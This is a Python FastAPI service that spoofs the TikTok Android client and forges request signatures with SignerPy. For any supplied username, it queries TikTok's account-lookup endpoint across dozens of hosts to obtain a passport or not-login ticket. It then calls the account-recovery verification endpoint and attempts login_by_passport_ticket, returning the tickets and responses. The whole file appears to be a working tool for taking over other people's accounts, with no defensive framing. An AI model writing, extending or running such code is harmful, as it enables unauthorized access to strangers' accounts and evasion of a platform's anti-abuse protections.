from fastapi import FastAPI
import httpx
import asyncio
import time
import random
import secrets
import SignerPy

app = FastAPI()


HOSTS = [
    "api16-core-aion-useast5.us.tiktokv.com",
    "api16-core-apix-quic.tiktokv.com",
    "api16-core-apix.tiktokv.com",
    "api16-core-baseline.tiktokv.com",
    "api16-core-c-alisg.tiktokv.com",
    "api16-core-c-useast1a.tiktokv.com",
    "api16-core-quic.tiktokv.com",
    "api16-core-useast5.us.tiktokv.com",
    "api16-core-useast8.us.tiktokv.com",
    "api16-core-va.tiktokv.com",
    "api16-core-ycru.tiktokv.com",
    "api16-core-zr.tiktokv.com",
    "api16-core.tiktokv.com",
    "api16-core.ttapis.com",
    "api16-normal-aion-useast5.us.tiktokv.com",
    "api16-normal-apix-quic.tiktokv.com",
    "api16-normal-apix.tiktokv.com",
    "api16-normal-baseline.tiktokv.com",
    "api16-normal-c-alisg.tiktokv.com",
    "api16-normal-c-useast1a.tiktokv.com",
    "api16-normal-c-useast1a.musical.ly",
    "api16-normal-no1a.tiktokv.eu",
    "api16-normal-quic.tiktokv.com",
    "api16-normal-useast5.tiktokv.us",
    "api16-normal-useast5.us.tiktokv.com",
    "api16-normal-useast8.us.tiktokv.com",
    "api16-normal-va.tiktokv.com",
    "api16-normal-vpc2-useast5.us.tiktokv.com",
    "api16-normal-zr.tiktokv.com",
    "api16-normal.tiktokv.com",
    "api16-normal.ttapis.com",
    "api19-core-c-alisg.tiktokv.com",
    "api19-core-c-useast1a.tiktokv.com",
    "api19-core-useast5.us.tiktokv.com",
    "api19-core-va.tiktokv.com",
    "api19-core-zr.tiktokv.com",
    "api19-core.tiktokv.com",
    "api19-normal-c-alisg.tiktokv.com",
    "api19-normal-c-useast1a.musical.ly",
    "api19-normal-c-useast1a.tiktokv.com",
    "api19-normal-useast5.us.tiktokv.com",
    "api19-normal-va.tiktokv.com",
    "api19-normal-zr.tiktokv.com",
    "api19-normal.tiktokv.com",
]


class TikTokFlow:
    def __init__(self, username):
        self.username = username

        self.params = {
            "device_platform": "android",
            "ssmix": "a",
            "channel": "googleplay",
            "aid": "1233",
            "app_name": "musical_ly",
            "version_code": "370805",
            "version_name": "37.8.5",
            "manifest_version_code": "2023708050",
            "update_version_code": "2023708050",
            "ab_version": "37.8.5",
            "os_version": "10",
            "device_type": f"rk{random.randint(3000,4000)}",
            "device_id": str(random.randint(10**18, 10**19-1)),
            "iid": str(random.randint(10**18, 10**19-1)),
            "openudid": secrets.token_hex(8),
            "resolution": "1600*900",
            "dpi": "240",
            "language": "ar",
            "os_api": "29",
            "ac": "wifi",
            "timezone_name": "Asia/Riyadh",
            "carrier_region": "SA",
            "sys_region": "SA",
            "region": "SA",
            "app_language": "ar",
            "timezone_offset": "10800",
            "request_tag_from": "h5",
            "account_param": username,
            "scene": "4",
            "mix_mode": "1",
        }

        self.headers = {
            "User-Agent": f"com.zhiliaoapp.musically/{self.params['manifest_version_code']}"
        }

        # ⚡ connection pool سريع
        self.client = httpx.AsyncClient(timeout=6)

    # =========================
    # SIGN
    # =========================
    def sign(self, params):
        sig = SignerPy.sign(params=params)
        return {
            "x-ss-req-ticket": sig.get("x-ss-req-ticket", ""),
            "x-ss-stub": sig.get("x-ss-stub", ""),
            "x-argus": sig.get("x-argus", ""),
            "x-gorgon": sig.get("x-gorgon", ""),
            "x-khronos": sig.get("x-khronos", ""),
            "x-ladon": sig.get("x-ladon", ""),
        }

    # =========================
    # LOOKUP PARALLEL
    # =========================
    async def lookup_host(self, host):
        try:
            params = self.params.copy()
            ts = int(time.time())
            params["ts"] = ts
            params["_rticket"] = int(ts * 1000)

            headers = self.sign(params)
            headers["x-tt-passport-csrf-token"] = secrets.token_hex(16)

            url = f"https://{host}/passport/account_lookup/username/"

            r = await self.client.post(url, params=params, headers=headers)
            j = r.json()

            accounts = j.get("data", {}).get("accounts", [])
            if not accounts:
                return None

            acc = accounts[0]

            return {
                "host": host,
                "ticket": acc.get("passport_ticket") or acc.get("not_login_ticket"),
                "oauth": acc.get("oauth_login_only", False),
                "raw": j,
            }

        except:
            return None

    # =========================
    # RUN ALL HOSTS FAST
    # =========================
    async def run_lookup(self):
        tasks = [self.lookup_host(h) for h in HOSTS]

        for coro in asyncio.as_completed(tasks):
            res = await coro
            if res:
                for t in tasks:
                    t.cancel()
                return res

        return None

    # =========================
    # SAFE + AUTH (FAST FIRST HIT)
    # =========================
    async def safe_auth(self, ticket):
        async def run(host):
            try:
                params = self.params.copy()
                ts = int(time.time())
                params["ts"] = ts
                params["_rticket"] = int(ts * 1000)

                params.pop("account_param", None)
                params["not_login_ticket"] = ticket
                params["target"] = "recover_account"

                headers = self.sign(params)

                safe = await self.client.get(
                    f"https://{host}/passport/shark/safe_verify/",
                    params=params,
                    headers=headers,
                )

                auth = await self.client.get(
                    f"https://{host}/passport/auth/available_ways/",
                    params=params,
                    headers=headers,
                )

                return host, safe.text, auth.text

            except:
                return None

        tasks = [run(h) for h in HOSTS]

        for coro in asyncio.as_completed(tasks):
            res = await coro
            if res:
                for t in tasks:
                    t.cancel()
                return res

        return None

    # =========================
    # LOGIN FAST STOP ON SUCCESS
    # =========================
    async def login(self, ticket):
        async def run(host):
            try:
                params = self.params.copy()
                ts = int(time.time())
                params["ts"] = ts
                params["_rticket"] = int(ts * 1000)

                params.pop("account_param", None)
                params["passport_ticket"] = ticket

                headers = self.sign(params)

                r = await self.client.post(
                    f"https://{host}/passport/user/login_by_passport_ticket/",
                    params=params,
                    headers=headers,
                )

                return host, r.text, dict(r.headers)

            except:
                return None

        tasks = [run(h) for h in HOSTS]

        for coro in asyncio.as_completed(tasks):
            res = await coro

            if res:
                for t in tasks:
                    t.cancel()

                host, text, headers = res

                # stop conditions
                if "2135" in text:
                    return {"status": "blocked", "response": text}

                return {"status": "done", "host": host, "response": text, "headers": headers}

        return None


# =========================
# API
# =========================
@app.get("/check")
async def check(username: str):
    flow = TikTokFlow(username)

    lookup = await flow.run_lookup()
    if not lookup:
        return {"error": "no_ticket"}

    ticket = lookup["ticket"]
    oauth = lookup["oauth"]

    safe_auth = await flow.safe_auth(ticket)
    login = await flow.login(ticket)

    return {
        "ticket": ticket,
        "oauth": oauth,
        "lookup_host": lookup["host"],
        "safe_auth": safe_auth,
        "login": login,
    }
